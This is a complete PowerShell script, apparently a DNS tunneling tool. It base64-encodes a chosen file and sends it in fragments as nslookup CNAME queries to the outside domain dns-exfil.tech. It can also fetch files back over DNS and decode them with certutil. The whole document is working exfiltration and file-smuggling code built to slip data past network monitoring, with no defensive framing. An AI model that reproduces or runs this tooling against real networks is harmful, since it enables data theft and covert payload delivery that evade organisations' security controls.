function Upload-DNSFile{
    #Allow the user to specify the file they want to upload using explorer.exe interface 
    $openFile = New-Object System.Windows.Forms.OpenFileDialog
    $null = $openFile.ShowDialog()
    $base64File = $null
    
    #Verify the the file is not empty or not selected before attempting to convert the file to base64
    try{
        if (-not ( $openFile.FileName ) -or -not( Get-Content $openFile.FileName)) {
            write-host "ERROR: No file selected or Empty file"
            return
        } else {
            $base64File = [convert]::ToBase64String((Get-Content -path $openFile.FileName -Encoding byte)) 
        }
    } catch {
        write-host "ERROR: Issue with opening file"
        return
    }

    #Create the DNS record to collect the key when starting file uploads 
    $keyDNSRecord = "up.start." + $openFile.SafeFileName.Replace(".","-").Replace(" ","_") + ".dns-exfil.tech"

    #Collect the key from the NSlookup
    $key = nslookup -type=CNAME $keyDNSRecord 2>$null  | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}

    #Verify that a key was collected from NSlookup
    If (($key -eq "ERROR") -or ($key -eq $null)) { 
        write-host "ERROR: Unable to start upload"
        return 
    } ElseIf ($key -eq "EXIST") {
        write-host "ERROR: File already exists"
        return
    } Else { 
        write-host "Key: OK" $key 
    } 

    #Initialize fragment count
    $count = 0

    #Upload the base64 encoded file in fragments of 60 base64 characters
    for (($i = 0); $i -lt $base64File.length; ($i = $i + 60)){
        #Calculate the length of the substring to prevent going past the base64file string
        $substringLength = If (($i + 60) -gt $base64File.length) {$base64File.length - $i} Else {60}

        #Create the DNS record to upload the current fragment of the base64file string
        $DNSUploadRecord = ("up.send." + $key + "." + $count + "." + $base64File.Substring($i, $substringLength) + ".dns-exfil.tech")

        #Upload the current fragment of the base64file string and verify no errors occured
        $DNSSend = nslookup -type=CNAME $DNSUploadRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
        If (($DNSSend -eq "ERROR") -or ($DNSSend -eq $null)) { 
            write-host "ERROR: Issue with transfer $i/" ($base64File.length)
            return
        } Else { 
            write-host "Count:$count ( $i / "$base64File.length" ): OK" 
        } 

        #Increase fragment count
        $count += 1
    }

    #Send a DNS request to signify the end of file upload
    $DNSEnd = nslookup -type=CNAME ("up.end."+ $key +".dns-exfil.tech")  2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
    If (($DNSEnd -eq "ERROR") -or ($DNSEnd -eq $null)) {
        write-host "ERROR: Unable to end transmission, please try again."
        return 
    }  Else { 
        write-host "END: OK" 
    }
    clear
    write-host "Successfully uploaded" $openFile.SafeFileName.Replace(".","-").Replace(" ","_") 
}

function Download-DNSFile {
    #Prompt the user for an application name
    $applicationName = read-host -Prompt "Enter application name: "

    #Create the DNS record to request the number of fragments 
    $DNSApplicationNameRecord = "dn.info." + $applicationName + ".dns-exfil.tech"
    
    #Collect the number of fragments required to download the file
    $fragmentCount = nslookup -type=CNAME -timeout=10 $DNSApplicationNameRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
    If (($fragmentCount -eq "ERROR") -or ($fragmentCount -eq $null)) { 
        write-host "ERROR: Unable to start download"
        return 
    } Elseif ($fragmentCount -eq "DNE"){ 
        write-host "ERROR:" $applicationName "does not exist"
    } Else {
        write-host "size: OK" $fragmentCount 
    } 

    #Iterate through the fragments and add the base64 string to a download string 
    $downloadStringBase64 = $null
    for( $i = 0; $i -lt $fragmentCount; $i++ ){
        #Create the DNS record for the current fragment
        $downloadDNSRecord = "dn.get." + $applicationName + "." + $i + ".dns-exfil.tech"

        #Use the downloadDNSRecord to download the current fragment and append it to the download string
        $downloadStringBase64 += nslookup -type=CNAME -timeout=10 $downloadDNSRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
    
        #Verify that there were no errors in the download string when downloading the application
        If ($downloadStringBase64 -contains "ERROR") { 
            write-host "ERROR: Error encountered while downloading"
            return 
        } Elseif ($downloadStringBase64 -eq $null) {
            write-host "ERROR: Nothing was downloaded"
            return
        } Elseif ($fragmentCount -contains "DNE"){ 
            write-host "ERROR:" $applicationName "does not exist"
            return
        } Else {
            write-host "Fragment Count: " ($i+1) " /" $fragmentCount
        } 
    }

    #Try to save the application to the computer
    $saveFile = New-Object System.Windows.Forms.SaveFileDialog
    try{
        $saveFile.FileName = $applicationName.replace("-",".").replace("_"," ")
        $null = $saveFile.ShowDialog()
        $downloadStringBase64 > pain.txt
        certutil -decode pain.txt $saveFile.FileName
        rm pain.txt
    } catch {
        write-host "ERROR: Unable to save file"
        return
    }
    clear
    write-host "Successfully downloaded" $saveFile.FileName
}


$menu = $null
while ($menu -ne "Q"){
    $menu = read-host -Prompt 'Type "1" to upload a file, "2" to download a file, or "Q" to exit'
    if ($menu -eq "1"){ Upload-DNSFile }
    elseif ($menu -eq "2"){ Download-DNSFile }
    elseif ($menu -ne "Q"){ write-host "Invalid input" }
}